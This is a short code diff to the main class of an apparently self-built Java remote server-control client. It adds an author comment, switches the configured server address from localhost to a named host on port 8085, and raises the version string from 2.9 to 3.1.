@@ -4,13 +4,18 @@ import ch.lebois.client.configure.Autostart;
 import ch.lebois.client.configure.ClientConfigure;
 import ch.lebois.client.handler.CommandReader;
 
+/**
+ * @author Wetwer
+ * @project server-control
+ **/
+
 public class ClientApplication {
 
     public static void main(String[] args) {
         ClientConfigure clientConfigure = new ClientConfigure();
-        clientConfigure.setServer("http://localhost:8090/");
-//        clientConfigure.setServer("http://scorewinner.ch:8090/");
-        clientConfigure.setArch("2.9");
+//        clientConfigure.setServer("http://localhost:8085/");
+        clientConfigure.setServer("http://scorewinner.ch:8085/");
+        clientConfigure.setArch("3.1");
 
 
         new Autostart().decide();
